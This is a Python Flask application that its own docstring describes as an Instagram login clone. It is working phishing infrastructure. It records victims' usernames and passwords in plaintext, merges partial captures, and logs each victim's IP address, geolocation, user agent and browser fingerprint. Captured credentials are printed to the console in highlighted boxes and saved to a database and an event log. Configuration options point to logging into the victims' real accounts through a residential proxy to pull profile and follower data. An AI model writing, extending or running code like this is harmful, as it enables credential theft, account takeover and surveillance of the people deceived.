"""
Insight Capture — Instagram login clone + real account analysis.

Env:
  SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
  ADMIN_TOKEN        console password             (unset = open, dev only)
  DATA_DIR           sqlite + log directory       (default ./data)
  GEO                1 to enable IP geo lookup    (default off)
  GEO_TIMEOUT        geo lookup timeout, seconds  (default 1.2)
  GEO_TTL            geo cache TTL, seconds       (default 3600)
  ANSI               0 to strip log colours       (default: on)
  PORT               listen port                  (default 5000)
  TRUST_PROXY        trusted proxy hops           (default 1, 0 = direct)
  CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
  COOKIE_SECURE      1/0                          (default: on when RENDER is set)
  LOGIN_WAIT         seconds to wait for verdict  (default 20)
  IG_PROXY           residential proxy            (optional, recommended)
  IG_MAX_PEOPLE      follower/following cap       (default 3000)
"""
from __future__ import annotations

import csv
import hmac
import io
import ipaddress
import json
import logging
import os
import secrets
import sqlite3
import sys
import threading
import time
import unicodedata
import urllib.request
import uuid
from collections import OrderedDict, deque
from datetime import datetime, timezone
from logging.handlers import RotatingFileHandler
from pathlib import Path
from urllib.parse import urlencode

from flask import (
    Flask,
    Response,
    abort,
    g,
    jsonify,
    redirect,
    request,
    session,
    url_for,
)
from markupsafe import escape
from werkzeug.middleware.proxy_fix import ProxyFix

import ig

# ============================== config ==============================
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
GEO_ENABLED = os.environ.get("GEO", "0") == "1"
GEO_TIMEOUT = float(os.environ.get("GEO_TIMEOUT", "1.2"))
GEO_TTL = int(os.environ.get("GEO_TTL", "3600"))
GEO_FAIL_TTL = int(os.environ.get("GEO_FAIL_TTL", "120"))
TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
COOKIE_MAX_AGE = 60 * 60 * 24 * 365
LOGIN_WAIT = float(os.environ.get("LOGIN_WAIT", "20"))
SYNC_MIN_INTERVAL = int(os.environ.get("SYNC_MIN_INTERVAL", "90") or 90)

_ansi_env = os.environ.get("ANSI")
ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else True

DATA_DIR.mkdir(parents=True, exist_ok=True)
DB_PATH = DATA_DIR / "insight.sqlite3"
JSONL_PATH = DATA_DIR / "events.jsonl"


def _load_secret() -> str:
    env = os.environ.get("SECRET_KEY")
    if env:
        return env
    path = DATA_DIR / "secret.key"
    try:
        if path.exists():
            existing = path.read_text(encoding="utf-8").strip()
            if len(existing) >= 32:
                return existing
    except OSError:
        pass
    generated = secrets.token_hex(32)
    try:
        path.write_text(generated + "\n", encoding="utf-8")
        os.chmod(path, 0o600)
    except OSError:
        pass
    return generated


app = Flask(__name__)
app.secret_key = _load_secret()
if TRUST_PROXY > 0:
    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=TRUST_PROXY, x_proto=TRUST_PROXY, x_host=TRUST_PROXY)
app.config.update(
    SESSION_COOKIE_NAME="insight_session",
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=(
        os.environ.get("COOKIE_SECURE", "1" if os.environ.get("RENDER") else "0") != "0"
    ),
    PERMANENT_SESSION_LIFETIME=COOKIE_MAX_AGE,
    MAX_CONTENT_LENGTH=512 * 1024,
    JSON_SORT_KEYS=False,
)

# ============================== logging ==============================
logger = logging.getLogger("insight")
logger.setLevel(os.environ.get("LOG_LEVEL", "INFO"))
logger.propagate = False
_fmt = logging.Formatter("%(asctime)s %(levelname)-5s %(message)s")

if not logger.handlers:
    _sh = logging.StreamHandler(sys.stdout)
    _sh.setFormatter(_fmt)
    logger.addHandler(_sh)

    _fh = RotatingFileHandler(DATA_DIR / "insight.log", maxBytes=1_000_000, backupCount=3)
    _fh.setFormatter(_fmt)
    logger.addHandler(_fh)

_jsonl_lock = threading.Lock()

# --- ANSI palette ---
C = {
    "reset": "\033[0m",
    "cred": "\033[1;33m",
    "cred_val": "\033[1;97m",
    "uval": "\033[1;96m",
    "pval": "\033[1;95m",
    "ctx": "\033[2;36m",
    "meta": "\033[1;35m",
    "ok": "\033[1;32m",
    "bad": "\033[1;31m",
}
BOX_W = 64
_ZERO_W = "\u200d\ufe0f"


def paint(text: str, color: str) -> str:
    return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text


def _char_w(ch: str) -> int:
    if ch in _ZERO_W or unicodedata.combining(ch):
        return 0
    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1


def fit(text: str, width: int) -> str:
    """Truncate + pad by display width (emoji/CJK aware)."""
    out: list[str] = []
    used = 0
    for ch in str(text):
        cw = _char_w(ch)
        if used + cw > width:
            break
        out.append(ch)
        used += cw
    return "".join(out) + " " * (width - used)


def print_box(title: str, lines: list, color: str = "cred", value_color: str = "cred_val") -> None:
    """Bordered block on stdout. A line may be (text, colour) to override its colour."""
    inner = BOX_W - 2
    rows = [paint("╔" + "═" * BOX_W + "╗", color),
            paint("║ ", color) + paint(fit(title, inner), color) + paint(" ║", color),
            paint("╠" + "═" * BOX_W + "╣", color)]

    for line in lines:
        text, vc = line if isinstance(line, tuple) else (line, value_color)
        rows.append(paint("║ ", color) + paint(fit(text, inner), vc) + paint(" ║", color))

    rows.append(paint("╚" + "═" * BOX_W + "╝", color))
    sys.stdout.write("\n" + "\n".join(rows) + "\n")
    sys.stdout.flush()


def emit(payload: dict, boxes: list[tuple] | None = None) -> None:
    """Credential box on stdout + one machine line in events.jsonl."""
    for box in boxes or []:
        print_box(box[0], box[1], box[2] if len(box) > 2 else "cred",
                  box[3] if len(box) > 3 else "cred_val")

    stamp = iso_now()
    body = {"ts": stamp, "kind": "CREDENTIAL", **payload}

    lines = [f"── CREDENTIAL ── {stamp}"]
    for k, v in payload.items():
        if isinstance(v, dict):
            for sk, sv in v.items():
                lines.append(f"   {sk}: {str(sv)[:200]}")
        else:
            lines.append(f"   {k}: {str(v)[:400]}")
    logger.info("\n".join(lines))

    try:
        with _jsonl_lock, JSONL_PATH.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(body, ensure_ascii=False) + "\n")
    except OSError:
        pass


# ============================== time ==============================
def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def iso_ago(seconds: int) -> str:
    return datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")


# ============================== storage ==============================
_db_lock = threading.Lock()

SCHEMA = """
CREATE TABLE IF NOT EXISTS creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cid TEXT, sid TEXT, source TEXT, username TEXT, password TEXT,
    ip TEXT, ua TEXT, referer TEXT, accept_lang TEXT,
    meta_json TEXT, country TEXT, city TEXT, isp TEXT, geo_json TEXT,
    verdict TEXT DEFAULT '', created_at TEXT
);
CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);

CREATE TABLE IF NOT EXISTS ig_state (
    cid TEXT PRIMARY KEY,
    username TEXT,
    phase TEXT DEFAULT 'idle',
    error TEXT DEFAULT '',
    notice TEXT DEFAULT '',
    profile_json TEXT,
    counts_json TEXT,
    lists_json TEXT,
    synced_at INTEGER DEFAULT 0,
    created_at TEXT
);
CREATE TABLE IF NOT EXISTS ig_actions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cid TEXT, kind TEXT, target TEXT, ok INTEGER, detail TEXT, created_at TEXT
);
"""

INSERT_SQL = """INSERT INTO creds
    (cid, sid, source, username, password, ip, ua, referer,
     accept_lang, meta_json, country, city, isp, geo_json, created_at)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""


def connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=15, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=15000")
    return conn


def _with_retry(fn, attempts: int = 5):
    """Retry on transient SQLite lock contention."""
    delay = 0.05
    for attempt in range(attempts):
        try:
            return fn()
        except sqlite3.OperationalError as exc:
            msg = str(exc).lower()
            if ("locked" not in msg and "busy" not in msg) or attempt == attempts - 1:
                raise
            time.sleep(delay)
            delay = min(delay * 2, 0.8)


def init_db() -> None:
    with _db_lock:
        conn = connect()
        try:
            conn.executescript(SCHEMA)
            conn.commit()
        finally:
            conn.close()


def recent_cred_id(cid: str, username: str, password: str, seconds: int = 8) -> int | None:
    conn = connect()
    try:
        row = conn.execute(
            "SELECT id FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? "
            "ORDER BY id DESC LIMIT 1",
            (cid, username, password, iso_ago(seconds)),
        ).fetchone()
        return int(row["id"]) if row else None
    finally:
        conn.close()


def set_verdict(cred_id: int, verdict: str) -> None:
    conn = connect()
    try:
        conn.execute("UPDATE creds SET verdict=? WHERE id=?", (verdict[:24], cred_id))
        conn.commit()
    finally:
        conn.close()


# ---------------- instagram state ----------------
def save_state(cid: str, fields: dict) -> None:
    cols: dict[str, object] = {}
    if "phase" in fields:
        cols["phase"] = fields.get("phase")
    if "error" in fields:
        cols["error"] = (fields.get("error") or "")[:400]
    if "notice" in fields:
        cols["notice"] = (fields.get("notice") or "")[:200]
    payload = fields.get("payload")
    if payload:
        cols["profile_json"] = json.dumps(payload.get("profile") or {}, ensure_ascii=False)
        cols["counts_json"] = json.dumps(payload.get("counts") or {}, ensure_ascii=False)
        cols["lists_json"] = json.dumps(payload.get("lists") or {}, ensure_ascii=False)
        cols["synced_at"] = int(payload.get("synced_at") or 0)

    conn = connect()
    try:
        conn.execute("INSERT OR IGNORE INTO ig_state (cid, username, created_at) VALUES (?,?,?)",
                     (cid, "", iso_now()))
        if cols:
            sets = ", ".join(f"{k}=?" for k in cols)
            conn.execute(f"UPDATE ig_state SET {sets} WHERE cid=?", (*cols.values(), cid))
        conn.commit()
    finally:
        conn.close()


def load_state(cid: str) -> dict:
    conn = connect()
    try:
        row = conn.execute("SELECT * FROM ig_state WHERE cid=?", (cid,)).fetchone()
    finally:
        conn.close()
    if not row:
        return {}
    return {
        "phase": row["phase"] or "idle",
        "error": row["error"] or "",
        "notice": row["notice"] or "",
        "synced_at": row["synced_at"] or 0,
        "profile": json.loads(row["profile_json"] or "{}"),
        "counts": json.loads(row["counts_json"] or "{}"),
        "lists": json.loads(row["lists_json"] or "{}"),
    }


def log_action(cid: str, kind: str, target: str, ok: bool, detail: str = "") -> None:
    conn = connect()
    try:
        conn.execute(
            "INSERT INTO ig_actions (cid, kind, target, ok, detail, created_at) VALUES (?,?,?,?,?,?)",
            (cid, kind, target[:80], 1 if ok else 0, detail[:200], iso_now()),
        )
        conn.commit()
    finally:
        conn.close()


def _ig_log(text: str, level: str = "info") -> None:
    getattr(logger, level if level in ("info", "warning", "error") else "info")(text)
    if level == "error":
        print_box("⚠ INSTAGRAM", [(text[:120], "cred_val")], "bad", "ctx")


ig.on_state = save_state
ig.on_log = _ig_log


# ============================== helpers ==============================
_rate: dict[str, deque] = {}
_rate_lock = threading.Lock()
_geo_cache: "OrderedDict[str, tuple[float, dict]]" = OrderedDict()
_geo_lock = threading.Lock()
GEO_MAX = 2000


def client_ip() -> str:
    """Real client IP. ProxyFix already normalises XFF; a custom header can override."""
    if CLIENT_IP_HEADER:
        raw = request.headers.get(CLIENT_IP_HEADER, "")
        if raw:
            return raw.split(",")[0].strip() or "-"
    return request.remote_addr or "-"


def is_private(ip: str) -> bool:
    if not ip or ip == "-":
        return True
    try:
        addr = ipaddress.ip_address(ip.split("%")[0])
    except ValueError:
        return True
    return (
        addr.is_private or addr.is_loopback or addr.is_link_local
        or addr.is_reserved or addr.is_multicast or addr.is_unspecified
    )


def rate_ok(key: str, limit: int, window: int = 60) -> bool:
    now = time.time()
    with _rate_lock:
        dq = _rate.get(key)
        if dq is None:
            dq = _rate[key] = deque()
        while dq and now - dq[0] > window:
            dq.popleft()
        if len(dq) >= limit:
            return False
        dq.append(now)
        if len(_rate) > 20_000:
            for dead in [k for k, v in _rate.items() if not v][:5000]:
                _rate.pop(dead, None)
        return True


def _geo_lookup(ip: str) -> dict:
    url = ("http://ip-api.com/json/" + ip +
           "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
    try:
        with urllib.request.urlopen(url, timeout=GEO_TIMEOUT) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
    except Exception:
        return {}
    return data if data.get("status") == "success" else {}


def geo(ip: str) -> dict:
    if not GEO_ENABLED or is_private(ip):
        return {}
    now = time.time()
    with _geo_lock:
        hit = _geo_cache.get(ip)
        if hit and hit[0] > now:
            _geo_cache.move_to_end(ip)
            return hit[1]

    data = _geo_lookup(ip)

    with _geo_lock:
        _geo_cache[ip] = (now + (GEO_TTL if data else GEO_FAIL_TTL), data)
        _geo_cache.move_to_end(ip)
        while len(_geo_cache) > GEO_MAX:
            _geo_cache.popitem(last=False)
    return data


def make_initials(name: str) -> str:
    parts = [p for p in name.replace("_", ".").replace("-", ".").replace(" ", ".").split(".") if p]
    return ("".join(p[0] for p in parts[:2]) or name[:2] or "YO").upper()


def cred_box(title: str, username: str, password: str) -> tuple:
    return (title, [
        ("username : " + (username or "(blank)"), "uval"),
        ("password : " + (password or "(blank)"), "pval"),
    ], "cred", "uval")


def ctx_box(ip: str, source: str, ua: str, place: str) -> tuple:
    return ("context", [
        ("ip       : " + (ip or "-"), "ctx"),
        ("source   : " + (source or "-"), "ctx"),
        ("place    : " + (place or "-"), "ctx"),
        ("ua       : " + (ua or "-")[:52], "ctx"),
    ], "cred", "ctx")


# ============================== auth / csrf ==============================
def admin_ok() -> bool:
    if not ADMIN_TOKEN:
        return True
    if session.get("admin"):
        return True
    tok = (request.args.get("token") or request.form.get("token")
           or request.headers.get("X-Admin-Token", ""))
    if tok and hmac.compare_digest(str(tok), ADMIN_TOKEN):
        session["admin"] = True
        return True
    return False


def csrf_token() -> str:
    tok = session.get("_csrf")
    if not tok:
        tok = secrets.token_urlsafe(24)
        session["_csrf"] = tok
    return tok


def csrf_ok() -> bool:
    sent = request.form.get("_csrf") or request.args.get("_csrf") or ""
    stored = session.get("_csrf") or ""
    return bool(sent and stored and hmac.compare_digest(sent, stored))


def html(body: str, status: int = 200) -> Response:
    return Response(body, status=status, mimetype="text/html; charset=utf-8")


# ============================== capture ==============================
def capture_credential(username: str, password: str, source: str, sid: str, meta: dict) -> tuple[int, bool]:
    """Insert, or merge into a very recent partial row for the same browser."""
    ip = client_ip()
    info = geo(ip)
    ua = (request.headers.get("User-Agent") or "")[:300]
    referer = (request.headers.get("Referer") or "")[:300]
    lang = (request.headers.get("Accept-Language") or "")[:120]
    place = ", ".join(x for x in (info.get("city"), info.get("country")) if x) or "-"
    now = iso_now()

    def _txn() -> tuple[int, bool]:
        with _db_lock:
            conn = connect()
            try:
                row = conn.execute(
                    "SELECT id FROM creds WHERE cid=? AND created_at>=? "
                    "AND (username='' OR password='') "
                    "AND (username=? OR username='' OR ? LIKE username || '%') "
                    "AND (password=? OR password='') "
                    "ORDER BY id DESC LIMIT 1",
                    (g.cid, iso_ago(90), username, username, password),
                ).fetchone()
                if row:
                    conn.execute(
                        "UPDATE creds SET username=?, password=?, source=?, ip=?, ua=?, referer=?, "
                        "accept_lang=?, meta_json=?, country=?, city=?, isp=?, geo_json=?, "
                        "created_at=? WHERE id=?",
                        (username, password, source[:16], ip, ua, referer, lang,
                         json.dumps(meta, ensure_ascii=False), info.get("country", "")[:64],
                         info.get("city", "")[:64], info.get("isp", "")[:96],
                         json.dumps(info, ensure_ascii=False), now, row["id"]),
                    )
                    conn.commit()
                    return int(row["id"]), False

                cur = conn.execute(INSERT_SQL, (
                    g.cid, sid[:24], source[:16], username[:200], password[:300], ip, ua,
                    referer, lang, json.dumps(meta, ensure_ascii=False),
                    info.get("country", "")[:64], info.get("city", "")[:64],
                    info.get("isp", "")[:96], json.dumps(info, ensure_ascii=False), now,
                ))
                conn.commit()
                return int(cur.lastrowid or 0), True
            finally:
                conn.close()

    cred_id, created = _with_retry(_txn)

    emit(
        {
            "id": cred_id, "op": "insert" if created else "merge", "cid": g.cid, "ip": ip,
            "source": source, "USERNAME": username, "PASSWORD": password,
            "ua": ua[:200], "referer": referer[:200],
            "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
            "fingerprint": {k: meta.get(k) for k in ("platform", "lang", "tz", "screen", "cores")
                            if meta.get(k)},
        },
        [cred_box(f"🔑 CREDENTIAL · {source} · #{cred_id}", username, password),
         ctx_box(ip, source, ua, place)],
    )
    session["last_cred"] = cred_id
    return cred_id, created
